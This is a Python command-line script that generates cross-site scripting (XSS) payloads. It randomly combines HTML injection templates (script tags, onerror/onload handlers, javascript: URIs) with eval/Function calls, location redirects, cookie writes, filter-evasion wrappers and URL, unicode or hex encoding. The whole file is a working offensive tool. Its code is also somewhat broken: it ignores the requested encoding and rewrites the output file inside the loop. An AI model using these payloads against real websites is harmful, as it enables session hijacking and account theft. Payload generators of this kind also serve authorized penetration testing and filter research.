import random
import argparse
import urllib.parse
import utils
import logging

# List of templates
templates = [
    "<script>{}</script>",
    "<img src='x' onerror='{}'>",
    "<a href='#' onclick='{}'>Click me</a>",
    "<svg onload='{}'></svg>",
    "<input type='text' value='{}'>",
    "<iframe src='javascript:{}'></iframe>",
    "<img src='javascript:{}'>",
    "<body onload='{}'></body>",
    "<div style='background-image: url(javascript:{})'></div>",
    "<input type='text' onblur='{}'>",
    "<img src='x' onmouseover='{}'>",
    "<script src='{}'></script>",
    "<svg><script>{}</script></svg>",
    "<a href='#' onclick='alert({})'>Click me</a>",
    "<img src='x' onerror='alert({})'>",
    "<svg onload='alert({})'></svg>",
    "<input type='text' value='alert({})'>",
    "<iframe src='javascript:alert({})'></iframe>",
    "<img src='javascript:alert({})'>",
    "<body onload='alert({})'></body>",
    "<div style='background-image: url(javascript:alert({}))'></div>",
    "<input type='text' onblur='alert({})'>",
    "<img src='x' onmouseover='alert({})'>",
    "<script src='{}.js'></script>",
    "<svg><script xlink:href='{}'></script></svg>",
    "<a href='#' onclick='eval({})'>Click me</a>",
    "<img src='x' onerror='eval({})'>",
    "<svg onload='eval({})'></svg>",
    "<input type='text' value='eval({})'>",
    "<iframe src='javascript:eval({})'></iframe>",
    "<img src='javascript:eval({})'>",
    "<body onload='eval({})'></body>",
    "<div style='background-image: url(javascript:eval({}))'></div>",
    "<input type='text' onblur='eval({})'>",
    "<img src='x' onmouseover='eval({})'>",
    "<script src='eval({}).js'></script>",
    "<svg><script xlink:href='eval({})'></script></svg>",
    "<a href='#' onclick='Function({})()'>Click me</a>",
    "<img src='x' onerror='Function({})()'>",
    "<svg onload='Function({})()'></svg>",
    "<input type='text' value='Function({})()'>",
    "<iframe src='javascript:Function({})()'></iframe>",
    "<img src='javascript:Function({})()'>",
    "<body onload='Function({})()'></body>",
    "<div style='background-image: url(javascript:Function({})())'></div>",
    "<input type='text' onblur='Function({})()'>",
    "<img src='x' onmouseover='Function({})()'>",
    "<script src='Function({})().js'></script>",
    "<svg><script xlink:href='Function({})()'></script></svg>",
]

# List of variations, abstractions, evasion techniques, and encoding schemes
variations = [
    "{}",
    "';{}//",
    "';{}/*",
    "'/*';{};'/*",
    "`${{ {} }}`",
    "{}",
    "${{ {} }}",
    "`${{ {} }}`",
    "new Function('{}')()",
    "Function('{}')()",
    "setTimeout('{}', 0)",
    "setInterval('{}', 0)",
    "eval('{}')",
    "eval(`{}`)",
    "document.write('{}')",
    "document.writeln('{}')",
    "window.location='{}'",
    "window['location']='{}'",
    "this['location']='{}'",
    "top.location='{}'",
    "top['location']='{}'",
    "self.location='{}'",
    "self['location']='{}'",
    "parent.location='{}'",
    "parent['location']='{}'",
    "document.location='{}'",
    "document['location']='{}'",
    "window.open('{}')",
    "alert('{}')",
    "confirm('{}')",
    "prompt('{}')",
    "console.log('{}')",
    "console['log']('{}')",
    "console.dir('{}')",
    "console['dir']('{}')",
    "document.cookie='{}'",
    "document['cookie']='{}'",
    "document.body.innerHTML='{}'",
    "document.body['innerHTML']='{}'",
    "document.documentElement.innerHTML='{}'",
    "document.documentElement['innerHTML']='{}'",
    "document.write('<img src=\"x\" onerror=\"{}\">')",
    "document.write('<script>{}</script>')",
    "document.writeln('<img src=\"x\" onerror=\"{}\">')",
    "document.writeln('<script>{}</script>')",
]

abstractions = [
    "{}",
    '{}',
    '{}()',
    '({})',
    '({}())',
    '[]["filter"]["constructor"]({})()',
    '[[]][0]["filter"]["constructor"]({})()',
]

evasion_techniques = [
    "<svg/onload='{}'>",
    "<script/x>{}//",
    "</script><svg><script>{}</script>",
    "<img src=x onerror='{}'>",
    "<iframe src='javascript:{}'></iframe>",
]

encoding_schemes = ["url", "unicode", "hex"]


def generate_payloads(num_payloads: int, encoding: str, seed: int, output_file: str):
    """
    Generates XSS payloads based on the specified parameters.

    Args:
        num_payloads (int): The number of payloads to generate.
        encoding (str): The encoding style to use for the payloads (e.g., "url", "html").
        seed (int): The seed value for the random number generator.
        output_file (str): The file path to save the generated payloads.

    Raises:
        ValueError: If num_payloads is less than or equal to 0.
        ValueError: If the encoding is not supported.

    Returns:
        None
    """

    # Set the seed for random number generator
    random.seed(seed)

    payloads = []

    for _ in range(num_payloads):
        template = random.choice(templates)
        variation = random.choice(variations)
        abstraction = random.choice(abstractions)
        evasion_technique = random.choice(evasion_techniques)
        encoding_scheme = random.choice(encoding_schemes)

        payload = template.format(variation.format(abstraction))
        payload = evasion_technique.format(payload)

        if encoding_scheme == "url":
            payload = urllib.parse.quote(payload)
        elif encoding_scheme == "unicode":
            payload = "".join(['\\u{:04x}'.format(ord(char))
                              for char in payload])
        elif encoding_scheme == "hex":
            payload = "".join(['%{:02x}'.format(ord(char))
                              for char in payload])

        payloads.append(payload)

        # Save generated payloads to file
        utils.write_payloads_to_file(payloads, output_file)
        utils.log_message(
            f"Generated payloads have been written to {output_file}.")

    return payloads


def main():
    parser = argparse.ArgumentParser(description='XSS Payload Generator')
    parser.add_argument("-n", "--num-payloads", type=int,
                        default=500, help="Number of payloads to generate")
    parser.add_argument("-e", "--encoding-scheme", type=str,
                        default="", help="Encoding Schemes['url', 'unicode', 'hex']")
    parser.add_argument("-s", "--seed", type=str, default=0,
                        help="Randomization Seeder")
    parser.add_argument("-o", "--output-file", type=str,
                        default="xss_payloads.txt", help="Output file name")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show verbose output")
    args = parser.parse_args()

    # Enable logging if verbose mode is enabled
    if args.verbose:
        logging.basicConfig(level=logging.INFO)

    # Extracting passed arguments
    num_payloads = args.num_payloads
    encoding_scheme = args.encoding_scheme
    seed = args.seed
    output_file = args.output_file

    # Generate payloads
    payloads = generate_payloads(
        num_payloads, encoding_scheme, seed, output_file)

    # Saving generated payloads to file
    utils.write_payloads_to_file(payloads, output_file)

    print(f"{num_payloads} XSS payloads have been generated and written to {output_file}.")
